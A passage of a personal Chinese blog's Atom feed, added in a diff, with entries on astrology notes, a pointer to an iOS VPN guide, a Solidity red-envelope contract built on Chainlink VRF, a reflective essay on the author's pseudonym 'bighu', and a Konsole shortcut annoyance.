+    <content type="html"><![CDATA[<h2 id="七个宇宙法则"><a href="#七个宇宙法则" class="headerlink" title="七个宇宙法则"></a>七个宇宙法则</h2><ul><li>唯心法则 ：一切万有（All That Is）唯心所造</li></ul><p>这里有一个翻译上的彩蛋（非常感谢作者保留了原来的含义）all是一切，that is 是万有，all没什么好说的，that is 是一个比较有意思的东西，因为他缺乏宾语，我们暂时不引用书中的上主。在that is中实际上就包含着唯心所造，直译就是 一切 所“是” 都是心的“是”，all that is are your is。我们把is 当做一个名词（或许用are这个复数不是很合适，属于是自己diy英语）</p><ul><li>上下一致法则：物质次元发生的事源头是心智次元</li></ul><p>首先要知道上下是什么，这里的上指的是你的心理，下指的是你的表现形式，也就是你心理怎么想的你就会怎么做（占星的关键是你会这么想）。这里需要区别于王阳明的知行合一，知行合一是一种“想”。</p><ul><li>能量振动法则：万物都是在运动的，人不可能两次踏入同一条河流</li></ul><p>所有的东西都是在变动中的，占星不是一个静态的分析过程，恰恰他是对动态的分析，他是一系列动作，而不是一个结果。l</p><ul><li>二元法则：对立面的永恒存在</li></ul><p>这是一个很有意思的观点，有意思的关键是无聊，喜欢的关键是厌倦，在这儿的关键是不在那儿。有点抽象，但是恰恰就是因为反面存在，我们才知道我们在正面，因为天会黑，所以天会亮。</p><ul><li>周期循环：事务有周期性的规律</li></ul><p>就像三十年河东三十年河西一样，不会一直是一边吃香，但是占星学的周期不是你现在没钱，你以后就有钱，占星的关键是你在什么样的周期里，实际上钱这个话题也只是某个周期，注意重要的不是你想要什么样的周期，而是周期来了你知道 is yours.（有点形而上的感觉）</p><ul><li>因果关系： 事出有因，又因必有果</li></ul><p>很喜欢这一段，因为它扯到了“业力”这个词，非常恰当，感觉这段都不要解释了</p><blockquote><p>业力：我们需要做出这么一点假设，也就是轮回，你可以不相信轮回，在最后我会尝试把轮回替换成一个你能接受的词，用轮回可以使佛教的理论闭合。</p><p>为什么会轮回，因为你有业力促使你不得不投胎回来，如你死不瞑目，刚想孝顺父母，自己先倒了。你倒了什么都不会发生（我不是很喜欢那些死了之后怎么怎么地的话），但是恰恰是你死了什么都没有（什么都做不了），所以才有业力，这业力就是你死不瞑目的东西，就这么说，如果你死不瞑目，你就一定会投胎，在无限的时间里（实际上死了就没有时间的说法）这是你唯一能做的（对比天伦之乐，指了却身前身后事，你不需要轮回，你没有轮回的想法），你收业力推动来到新一世，但是你看不到前一世的因果，而业力推动你做你该做的。</p><p>那么业力为什么可以推动你做什么呢？</p><p>这就是佛教的另一个话题 – 缘。业力推动缘分，缘分及是你投胎的目的（化缘），风吹幡动，是心动。缘起性空。这里不展开解释了。</p><p>那么我们来替换掉轮回—-</p><p>有这么一个故事，有一个，小时候看到有厨子炒菜，他想要做个厨子，后来他成为厨子了。</p><p>为什么小时候这么多事情，他偏偏看上厨子。（这是很形而上的理论）</p><p>这能说明他的业力吗？如果硬说不能也可以，但是业力的定义就是这个，业力促使他想要成为厨子（业力就是一种形而上）</p></blockquote><p>占星学要做的就是找到你的因果（找到你心动的点）。</p><ul><li>阴阳法则：向内求所&amp;向外求所</li></ul><p>阴阳象征着两种趋势，向内&amp;向外(懒得写了）</p><h2 id="占星的起点"><a href="#占星的起点" class="headerlink" title="占星的起点"></a>占星的起点</h2><p>你所站的位置就是星宫的起点，上方代表白昼，下方代表夜晚</p><p><img src="https://s2.loli.net/2024/09/21/TkpdwGsubWC7KnO.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/21/TkpdwGsubWC7KnO.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>占星学本身是研究上下一致性法则的学问</p><blockquote><p>上下一致性，也就是都是内心安排好了的，如果配合一点佛教的业力会更好理解一点，占星的本质是找到 上 → 投射出下，找到你的内心，投射出你的行动。</p></blockquote><blockquote><p><strong>随地大小记</strong>：巨蟹座与家庭和食物有关</p></blockquote><h3 id="key-word"><a href="#key-word" class="headerlink" title="key word"></a>key word</h3><p>元素，星座，行星，宫位，相位</p><h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><ul><li>火：代表让事情发生的驱动力</li><li>土：使内在驱动力变为现实</li><li>风：沟通</li><li>水：情感连结的驱动力</li></ul><p><strong>火象星座：牡牛座，狮子座，射手座</strong></p><p>火的目的是带领，启发，赋予。火系星座倾向与理性主义，不容易出现稳定，平衡，敏感，同理心，细腻这些特质（当然还会有其他的可能性，比如受水星影响）</p><p>牡牛座：拓荒者，为目标奋斗的人</p><p>狮子座：启发别人</p><p>射手座：追寻意义</p><p>火象的过度会导致周围的人很痛苦，且本人也可能活在一种虚伪之中。</p><p><strong>土象星座：金牛座，处女座，摩羯座</strong></p><p>土象星座更注重现实，他们更趋于稳定，平衡。他们需要基本的物质保障（不想火象，火象所需要的物质保障要求太高，所以很早就会放弃，）这也是土象星座的现实主义体现，他们需要做够维护他们长期发展的土壤，不能接受有上顿没下顿。</p><p>金牛和摩羯： 希望产出具体的东西，能被量化的东西</p><p>处女座：变动星座，切收水星影响较大，处女座往往需要更多的安全感，这样才能让ta生根发芽。</p><p>土象过度会导致追求物质，没有安全感，不愿意冒险，传统&amp;保守</p><p><strong>风象星座：双子座，天秤座，宝瓶座</strong></p><p>风象星座是最懂交流沟通的星座，他们知道如何把合适的信息传递给合适的人，他们往往更加理性，更少的将感性注入到信息中，这是消息能准确的根本。也是风象星座能在社交中如鱼得水的原因。</p><p>风象的过度会导致人过度的理性，而失去是世界而平衡（建筑平衡是土象星座擅长的）</p><p><strong>水象星座：巨蟹座，天蝎座，双鱼座</strong></p><p>水象星座表现为内向低调，他们更强调精神的安全感（土象更强调物质的安全感）水象人与火象人相反，他们更加敏感细腻。他们看上去表面平静，实际上内心是波涛汹涌。容易受环境的影响，同时也更能适应环境</p><p>巨蟹座：关注家庭提供的归属感</p><p>天蝎座：需要在亲密关系中找到安全感</p><p>双鱼座：希望在天人合一中找到安全感（也就敏感的人能找到天人和一）</p><p>水象元素的过度会导致人迷失自我，过于细致的同感 导致迷失自己真实的感觉。执着，依赖，不理性，喜欢控制 容易产生逃避依恋人格。</p><h3 id="元素的组合"><a href="#元素的组合" class="headerlink" title="元素的组合"></a>元素的组合</h3><p>了解了每个元素之后，就比较容易理解各种元素的组合会是什么情况。</p><p>火与土的组合可能缺乏细腻的觉知，但会显现出强大的动力，成为一个不畏艰险，能够将事情落实的理想主义者。</p><p>火与风的组合往往是怀抱着伟大理论的理想主义者。</p><p>火与水的组合则是真正具有创造力的人，不过情绪起伏很大。</p><p>土与水的组合会带来滋养的能力和负责的态度，十分关切自己和他人的安全保障。</p><p>土和风的组合带来的是枯燥和实际的特质，不过也有实事求是的智慧和幽默感。</p><p>风与水的组合则会特别重视关系，对人性了如指掌。</p><h3 id="缺乏元素"><a href="#缺乏元素" class="headerlink" title="缺乏元素"></a>缺乏元素</h3><p>注意这里的缺乏不是完全没有，而是在星象中很少有这些元素的体现。且缺乏元素往往会以相反的方式体现出来，如火元素代表的是直觉力，因此缺乏火元素的人可能带有负向的直觉。换句话说，他们总是预期不好的事会发生在自己身上，但缺乏火元素却有利于撰写犯罪或恐怖小说。</p><ul><li>没有行星落在火元素上</li></ul><p>缺少火元素表现为缺乏动力，活力。在人生轨迹上缺乏信赖感和自信心。他们更习惯相信：事情终究会没问题（这是一种消极的信心，表示对自己对自己所能掌控的一切的不自信，渴望事情能通过事情本身而被解决，自己一点手也插不上）。缺乏火元素的人可能更加热爱心理学，占星，算命这类（因为他们不习惯掌控自己的命运）。令：缺乏火元素的人一般不易“放下”，可能会被自己认定的事情蒙蔽双眼。</p><ul><li>没有行星落在土元素上</li></ul><p>缺乏土元素将导致不容易和金钱发生连接，也就是不明白钱是什么玩意儿。如对物价不敏感，对性价比不敏感，他们可能更在乎他们想要卖什么，而不在乎这东西值不值这个价。缺乏土元素可能更适合理财（如果他们意识到是要通过100块买110块的话，对金钱的不敏感可以使得他们在金融中找到更深层次的逻辑）。另外土元素缺乏可能对大自然有一种幼稚的情结，如热衷于穿着裸露，曲线毕露的模特。缺乏土元素的人适合通过 瑜伽，按摩，园艺，运动等方式来缓解。</p><p>土元素缺乏可能导致疑心病，上瘾症，不懂知足</p><ul><li>没有行星落在风元素上</li></ul><p>缺乏风元素一般表现为意识不到自己或他的的行动的意义，难以看清大局。缺乏风元素可能导致难以和他人做成合作关系。不能客观的看待自己的问题，容易沉浸在自己的痛苦之中。在沟通和学习的过程中比较缺乏信心，容易被他人的意见影响。缺乏风元素的人喜欢地图以及其他能提供方向的事务，同样也喜欢占星学。</p><ul><li>没有行星落在水元素上</li></ul><p>没有行星落在水元素上并不是说没有感性，而是处理不了感性，缺乏水元素的人可能部分消化自己的生命情感。在交友上可能无法与他人形成情感上的连接。他们会认为情感是一个令人痛苦的东西，容易通过自闭的方式压抑情感。他们容易在小时候遭受情感创伤（因为无法处理情感上的事情，而一直走不出来）。这类人容易深陷感情之中，无法自拔，也可能会变得极具情绪化。即要么无法控制情绪的表达，一直多愁善感。要么表现为无法和情绪连接，变成一个不会笑不会哭的人。缺少水元素的人可以通过音乐，艺术之类的东西上引导消化混乱的情绪。</p><h2 id="行星性质的三分法"><a href="#行星性质的三分法" class="headerlink" title="行星性质的三分法"></a>行星性质的三分法</h2><p><img src="https://s2.loli.net/2024/09/21/OEJpVCsTFSdwDhk.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/21/OEJpVCsTFSdwDhk.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;七个宇宙法则&quot;&gt;&lt;a href=&quot;#七个宇宙法则&quot; class=&quot;headerlink&quot; title=&quot;七个宇宙法则&quot;&gt;&lt;/a&gt;七个宇宙法则&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;唯心法则 ：一切万有（All That Is）唯心所造&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这里有一个翻</summary>
+      
+    
+    
+    
+    <category term="随笔" scheme="https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
+    
+    <category term="占星" scheme="https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/%E5%8D%A0%E6%98%9F/"/>
+    
+    
+    <category term="占星" scheme="https://bighu630.github.io/tags/%E5%8D%A0%E6%98%9F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ios翻墙教程</title>
+    <link href="https://bighu630.github.io/2024/09/21/ios%E7%BF%BB%E5%A2%99%E6%95%99%E7%A8%8B/"/>
+    <id>https://bighu630.github.io/2024/09/21/ios%E7%BF%BB%E5%A2%99%E6%95%99%E7%A8%8B/</id>
+    <published>2024-09-21T04:32:26.000Z</published>
+    <updated>2024-09-23T11:34:16.270Z</updated>
+    
+    <content type="html"><![CDATA[<p>由于手上没有ios的设备，可以看这个文章：<a href="https://laob.me/2300/">https://laob.me/2300/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;由于手上没有ios的设备，可以看这个文章：&lt;a href=&quot;https://laob.me/2300/&quot;&gt;https://laob.me/2300/&lt;/a&gt;&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="教程" scheme="https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    <category term="科学上网" scheme="https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
+    
+    
+    <category term="教程" scheme="https://bighu630.github.io/tags/%E6%95%99%E7%A8%8B/"/>
+    
+    <category term="科学上网" scheme="https://bighu630.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>chainLink vrf实验</title>
+    <link href="https://bighu630.github.io/2024/09/13/chainLink-vrf%E5%AE%9E%E9%AA%8C/"/>
+    <id>https://bighu630.github.io/2024/09/13/chainLink-vrf%E5%AE%9E%E9%AA%8C/</id>
+    <published>2024-09-13T06:00:42.000Z</published>
+    <updated>2024-09-23T11:34:16.269Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>这篇博客讲述了如何在Solidity中使用VRF编写一个可以生成随机红包的智能合约，详细介绍了红包的核心数据结构、创建红包的流程、如何通过VRF生成随机数来分配红包金额，以及如何使用Chainlink VRF完成随机数订阅和获取，最后通过部署在测试网络上的合约进行验证。</p></blockquote><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><strong>用vrf写一个随机红包</strong></p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p><strong>红包：</strong></p><pre><code class="solidity">struct Envelope &#123;    Type t;    // 类型，只是erc20 和eth红包    ERC20 token;  // erc20 ,如果是erc20红包，这里是erc2o的地址    address sender;  // 发红包的sender    uint balance;  // 金额    bool allowAll;  // 允许所有人领取    uint32 maxReceiver;  // 最大领取数，eg：最多3个人领取红包    bool avg; // 平均主义，每个红包的价值等于balance/maxReceiver //填false则使用随机红包    uint avgMonty; // 平均金额    uint timeOutBlocks; //超时可以回收红包 ,也可以打开未领取完的红包    address[] received;  // 已经领取过的列表&#125;</code></pre><p>每个红包中储存红包的信息,可以在允许过程中发送红包</p><p>**存储数据: **</p><pre><code class="solidity">mapping(bytes32 =&gt; Envelope) public envelopes;   // 红包hash  -&gt; 红包内容，领取红包时需要提供红包hashmapping(bytes32 =&gt; mapping(address =&gt; bool)) public addressAllowList;   // 红包对应的 allowlist 这个放在红包外面存是因为struct里面不能放mapmapping(bytes32 =&gt; mapping(address =&gt; bool)) addressGotList;  // 已经领取的列表,与received有点重复，建议将received修改为一个int,记录有多少人领过mapping(uint =&gt; bytes32) openWithVRF;   // 红包对应的vrf, 当红包是随即红包时会用到这个mapping(ERC20 =&gt; uint) ERC20Balance;    // 每个erc20对应的金额，合约自己可以通过看自己的eth余额来判断，erc20需要单独记录，应为可以同时存在多个合约，如果多个合约都是同一个erc20,需要判断erc20的approve是否足够mapping(bytes32 =&gt; uint[]) VRFKey;  // vrf 对应的随机数列表// VRFV2PlusClient public COORDINATOR;bytes32 keyHash = 0x787d74caea10b2b357790d5b5247c2f63d1d91572a9846f780606e4d953677ae;  // VRF 用到的key,可以去官方文档查uint256 s_subscriptionId;  // vrf 用到的另一个keyuint32 immutable callbackGasLimit = 100000;  // 官方推荐配置// The default is 3, but you can set this higher.uint16 immutable requestConfirmations = 3;  //官方推荐配置</code></pre><p>上面的mapping 主要是红包合约的配置<br>下方的数据则是chainlink vrf的配置，这些key可以去官网查看具体的含义</p><h2 id="合约的初始化"><a href="#合约的初始化" class="headerlink" title="合约的初始化"></a>合约的初始化</h2><pre><code class="solidity">    constructor(        uint256 _subscriptionId,        address _coordinator    ) VRFConsumerBaseV2Plus(_coordinator)&#123;        s_subscriptionId = _subscriptionId;    &#125;</code></pre><p>初始化主要是赋值vrf的订阅id（后续具体操作有详细过程）</p><h2 id="构建红包"><a href="#构建红包" class="headerlink" title="构建红包"></a>构建红包</h2><pre><code class="solidity">    function createETHredEnvelope(        bool allowAll,        address[] memory allowList,        uint32 maxReceiver,        bool avg,        uint timeOutBlocks    ) public payable returns (bytes32) &#123;&#125;</code></pre><ul><li>allowAll：运行所有人领取，如果是true那么任何人都可以根据红包hash调用get方法领取红包</li><li>allowList：如果allowAll,那么allowList无用</li><li>maxReceiver：最大领取数，最大领取数可以比allowList小，这样代表有人领不到红包</li><li>avg： 是否平均，如果平均那么每个人领取到的金额 &#x3D; msg.value&#x2F;maxReceiver</li><li>timeOutBlocks：经过多少各block后超时，超时之后红包的发起人可以回收红包余额，或者打开红包</li></ul><pre><code class="solidity">    function createERC20redEnvelope(        address token,        uint size,  // erc20的数量        bool allowAll,        address[] memory allowList,        uint32 maxReceiver,        bool avg,        uint timeOutBlocks    ) public returns (bytes32) &#123;&#125;</code></pre><p><code>createERC20redEnvelope</code> 与<code>createETHredEnvelope</code> 的区别只是使用的是erc20</p><p>函数内的区别在与erc20要校验有没有足够的apporve</p><pre><code class="solidity">        uint approved = ERC20(token).allowance(msg.sender,address(this));        require(approved&gt;=ERC20Balance[ERC20(token)]+size);        ERC20Balance[ERC20(token)] += size;</code></pre><h2 id="添加AllowList"><a href="#添加AllowList" class="headerlink" title="添加AllowList"></a>添加AllowList</h2><pre><code class="solidity">    function allowSome(bytes32 hash, address[] memory allowList) public &#123;        require(envelopes[hash].balance != 0, &quot;envelop balance is 0&quot;);        require(envelopes[hash].sender == msg.sender,&quot;only envelops sender can do this&quot;);        for (uint i = 0; i &lt; allowList.length; i++) &#123;            addressAllowList[hash][allowList[i]] = true;        &#125;    &#125;</code></pre><p>这就不多解释了</p><h2 id="领取红包"><a href="#领取红包" class="headerlink" title="领取红包"></a>领取红包</h2><pre><code class="solidity">    function get(bytes32 hash) public &#123;&#125;</code></pre><p>领红包的方法签名很简单，只需要传一个红包hash就可以，但内部逻辑很复杂，重点看一下它里面的判断</p><pre><code class="solidity">        require(envelopes[hash].balance != 0, &quot;envelop balance is 0&quot;); // 判读红包余额不为0        require(!addressGotList[hash][msg.sender], &quot;has got&quot;); // 判断发起人是否已经领取过        require(   // 判断红包是否已经超时            envelopes[hash].timeOutBlocks &gt; block.number,            &quot;envelop timeOutBlocks is not enough&quot;        );        require(            addressAllowList[hash][msg.sender] || envelopes[hash].allowAll,// 判断发起人是否被允许            &quot;not allow&quot;        );        require(envelopes[hash].received.length &lt; envelopes[hash].maxReceiver, &quot;no more&quot;); // 还是判断是否已经领取完</code></pre><p>在领取上有两种逻辑，一种是平均红包，平均红包get后会马上到账。一种是随机数红包，随机数红包不会立马到账需要等领红包的人数达到maxReceiver 或者红包超时，后面会详细讲怎么领随机数红包。</p><h3 id="打开随机数红包"><a href="#打开随机数红包" class="headerlink" title="打开随机数红包"></a>打开随机数红包</h3><pre><code class="solidity">    function openEnvelopes(bytes32 hash)public&#123;        require(            envelopes[hash].timeOutBlocks &lt; block.number || envelopes[hash].received.length == envelopes[hash].maxReceiver,            &quot;envelop timeOutBlocks is not enough&quot;        );        require(envelopes[hash].maxReceiver &gt; 0,&quot;max receriver max more than 0&quot;);</code></pre><p>打开随机数红包一般是在领取时自动调用，如果领取人没有达到maxReciver,可以在红包超时后手动调用。</p><p>这个方法中会向vrf请求一个随机数，正常情况chainlink会调用fulfillRandomWords方法来返回随机数。</p><pre><code class="solidity">    function fulfillRandomWords(        uint256 requestId,        uint256[] calldata randomWords    ) internal override &#123;        require(randomWords.length == envelopes[openWithVRF[requestId]].received.length);        VRFKey[openWithVRF[requestId]] = randomWords;    &#125;</code></pre><p>实际上可以在这个方法里面写红包分发的内容，但是由于这一步是chainlink触发的是由他来执行手续费，所以这里面逻辑不能太复杂（实际上限制的参数就是keyHash 这个变量）</p><h2 id="手动打开红包"><a href="#手动打开红包" class="headerlink" title="手动打开红包"></a>手动打开红包</h2><p>由于chainlink返回的时候不能有复杂的逻辑，所以随机数红包只能由手动触发</p><pre><code class="solidity">    function openVRFEnvelop(bytes32 hash)public &#123;        uint[] memory randomWords = VRFKey[hash];        require(envelopes[hash].maxReceiver &gt; 0,&quot;max receriver max more than 0&quot;);        require(randomWords.length!=0,&quot;can not get vrf words&quot;);        uint16[] memory words = new uint16[](randomWords.length);        // 计算每一个小分段的权重     &#125;</code></pre><h3 id="vrf订阅id获取"><a href="#vrf订阅id获取" class="headerlink" title="vrf订阅id获取"></a>vrf订阅id获取</h3><p>首先我们需要去chainlink上领取一点测试币（link币和eth币，两个都要，如有已经有了可以跳过）</p><p>网址： <a href="https://faucets.chain.link/">https://faucets.chain.link/</a></p><p><img src="https://s2.loli.net/2024/09/13/FQyncdECKbWxgOv.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/13/FQyncdECKbWxgOv.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240913182431182"></p><p>然后需要去crf管理页面构建一个钱包合约，后面请求vrf随机数时会扣除Link币</p><p>网址：<a href="https://vrf.chain.link/">https://vrf.chain.link/</a></p><p><img src="https://s2.loli.net/2024/09/13/QtjAy4Ik1dzbTOw.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/13/QtjAy4Ik1dzbTOw.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240913182732964"></p><p>填完信息后，还是这样网址，下面会出现你的sub</p><p><img src="https://s2.loli.net/2024/09/13/WadlCnxB6PXRDMk.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/13/WadlCnxB6PXRDMk.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240913182948316"></p><p>点击你的sub,里面有sub的id，这个id就是合约部署时要用到的id，可以用这个id先把合约部署上去，后面要合约的地址</p><p><img src="https://s2.loli.net/2024/09/13/6vs7bCXQd5f89yE.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/13/6vs7bCXQd5f89yE.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240913183148412"></p><p>在这个页面的右下角找到fund 给这个sub冲点link币</p><p><img src="https://s2.loli.net/2024/09/13/NKPTeu9w4HQzOyG.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/13/NKPTeu9w4HQzOyG.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240913183021680"></p><p>冲完之后点左边的add cousumer ，把你的合约地址填进来</p><p>至此，这个红包合约就可以用了</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>这个红包我已经部署在测试网络上了，可以直接去上面试试</p><p><a href="https://sepolia.etherscan.io/address/0xc81c0913e6365eb31e761d1062b41dd5a96d2e90#writeContract">https://sepolia.etherscan.io/address/0xc81c0913e6365eb31e761d1062b41dd5a96d2e90#writeContract</a></p><p>合约源码后续会贴在这里（今天网太卡了，我环境一直下载不下来）</p><p>源码地址：(这两天环境弄好了我会把代码放上去，目前还是一个空项目)</p><p><a href="https://github.com/bighu630/redEnvelop">https://github.com/bighu630/redEnvelop</a></p>]]></content>
+    
+    
+    <summary type="html">这篇博客讲述了如何在Solidity中使用VRF编写一个可以生成随机红包的智能合约，详细介绍了红包的核心数据结构、创建红包的流程、如何通过VRF生成随机数来分配红包金额，以及如何使用Chainlink VRF完成随机数订阅和获取，最后通过部署在测试网络上的合约进行验证。</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="二层" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BA%8C%E5%B1%82/"/>
+    
+    
+    <category term="solidity" scheme="https://bighu630.github.io/tags/solidity/"/>
+    
+    <category term="vrf" scheme="https://bighu630.github.io/tags/vrf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>who is the bighu</title>
+    <link href="https://bighu630.github.io/2024/09/12/who-is-the-bighu/"/>
+    <id>https://bighu630.github.io/2024/09/12/who-is-the-bighu/</id>
+    <published>2024-09-12T13:06:45.000Z</published>
+    <updated>2024-09-23T11:34:16.270Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>bighu 是一个虚构的身份，用于为不成熟的自我构建一个成熟的自我，后来用来补全我所不知道的自我，再后来变成一个标签，而丧失bighu原有的内涵。</p></blockquote><h2 id="谁是bighu？"><a href="#谁是bighu？" class="headerlink" title="谁是bighu？"></a>谁是bighu？</h2><p>说来bighu这个名字源与一个影视作品，《穹顶之下》里面的一个有点反派味道的<code>Big Jim</code>。有中镇长的味道。当然bighu和这部电影关系不大，只是顺便用了这个名字</p><p>bighu其实在我看一些哲学书籍之前就存在，它的存在有一定的中二属性，也就是虚拟身份，就像是作家的笔名，bighu是我以我为笔时的笔名（省略一段意味深长，又点带鸡汤的话）。</p><p>借用一点存在主义的概念，<code>人是人所不是，人总是在“去成为什么”，而不是“是什么”, to be or not to be 的问题</code>,bighu 不是我，但bighu与我有一种 “去成为”的关系。</p><p><strong>那么bighu是一种理想主义吗？</strong></p><p>或许曾经可能是，但是<code>理想的理想主义应该是能接受不理想的</code>这种指涉循环使得bighu不是一种理想主义，bighu不代表我对理想的理解，甚至bighu可能代表我对不理想的理解，我也不知道，总之bighu逐渐变得消极（或者是我逐渐远离bighu）</p><p><strong>对理想的追求&#x3D;追求不理想</strong></p><h2 id="我是bighu吗？"><a href="#我是bighu吗？" class="headerlink" title="我是bighu吗？"></a>我是bighu吗？</h2><p>我想是的，我即是bighu，</p><p>但是我可以不是bighu</p><h2 id="bighu-我-真的存在吗？"><a href="#bighu-我-真的存在吗？" class="headerlink" title="bighu(我)真的存在吗？"></a>bighu(我)真的存在吗？</h2><p>我思故我在，如果有一天我放弃了上面说的那些东西,bighu就不在了，我也不再思了.</p><h2 id="bighu-是一个假想的对象吗-for一些心理需求"><a href="#bighu-是一个假想的对象吗-for一些心理需求" class="headerlink" title="bighu 是一个假想的对象吗(for一些心理需求)"></a>bighu 是一个假想的对象吗(for一些心理需求)</h2><p>这个问题很蠢，下一个(实际上是上一个，为了不打断阅读体验，这种有点蠢的问题放在最后面,但是很早就想到了)<br>蠢的原因是 问这个问题的人像是没看懂上面的 <code>bighu是我以我为笔时的笔名</code></p><p><strong>for bighu</strong></p>]]></content>
+    
+    
+    <summary type="html">bighu 是一个虚构的身份，用于为不成熟的自我构建一个成熟的自我，后来用来补全我所不知道的自我，再后来变成一个标签，而丧失bighu原有的内涵。</summary>
+    
+    
+    
+    <category term="随笔" scheme="https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
+    
+    
+    <category term="沉思录" scheme="https://bighu630.github.io/tags/%E6%B2%89%E6%80%9D%E5%BD%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>konsole奇怪的command bar</title>
+    <link href="https://bighu630.github.io/2024/09/11/konsole%E5%A5%87%E6%80%AA%E7%9A%84command-bar/"/>
+    <id>https://bighu630.github.io/2024/09/11/konsole%E5%A5%87%E6%80%AA%E7%9A%84command-bar/</id>
+    <published>2024-09-11T09:22:58.000Z</published>
+    <updated>2024-09-23T11:34:16.270Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>在这篇博客中，作者分享了在使用Konsole时意外触发命令栏的经历，虽然发现了一个潜在有用的功能，但由于该功能的快捷键与Vim用户常用的 esc 键冲突，导致了一些操作上的困扰。作者通过探索发现这是SSH管理器的快捷键，但Konsole的配置中并未明确指出此快捷键的冲突来源，给用户带来了一定的不便。</p></blockquote><h2 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h2><p>今天以打开konsole就发生了一件让我“高兴”的事情，我在无意间打开了konsole的一个command bar！！！</p><p><img src="https://pic.imgdb.cn/item/66e1629ad9c307b7e9e04226.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66e1629ad9c307b7e9e04226.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240911172512209"></p><p>我寻思这功能挺好的，虽然我还不知道怎么触发，但是可以后面在研究嘛。</p><p>然后我就开始了罪恶之旅，这个功能的触发键是<code>esc</code> ，我一老年vim用户，你把<code>esc</code> 抢走了这让我怎么活</p><p>又折腾半天，终于我明白了，这是ssh的快捷键</p><p><img src="https://s2.loli.net/2024/09/11/ihvWmUHtCekFfVX.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/11/ihvWmUHtCekFfVX.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>关键是这个快捷键居然不再konsole的配置里面，如果我在配置里面也配一个esc,它只会告诉我快捷键冲突，不会说是那个快捷键冲突，感觉是konsole的设计问题，最好是放一起，这还好我ssh里面有点东西，要没东西我估计我永原不知道 ssh管理器里面还有个快捷键</p>]]></content>
+    
+    
+    <summary type="html">在这篇博客中，作者分享了在使用Konsole时意外触发命令栏的经历，虽然发现了一个潜在有用的功能，但由于该功能的快捷键与Vim用户常用的 esc 键冲突，导致了一些操作上的困扰。作者通过探索发现这是SSH管理器的快捷键，但Konsole的配置中并未明确指出此快捷键的冲突来源，给用户带来了一定的不便。</summary>
+    
+    
+    
+    <category term="计算机" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
+    
+    <category term="linux" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"/>
+    
+    
+    <category term="kde" scheme="https://bighu630.github.io/tags/kde/"/>
+    
+    <category term="konsole" scheme="https://bighu630.github.io/tags/konsole/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>区块链应用与以太坊的交互</title>
+    <link href="https://bighu630.github.io/2024/09/11/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E4%B8%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%9A%84%E4%BA%A4%E4%BA%92/"/>
+    <id>https://bighu630.github.io/2024/09/11/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E4%B8%8E%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%9A%84%E4%BA%A4%E4%BA%92/</id>
+    <published>2024-09-11T07:52:13.000Z</published>
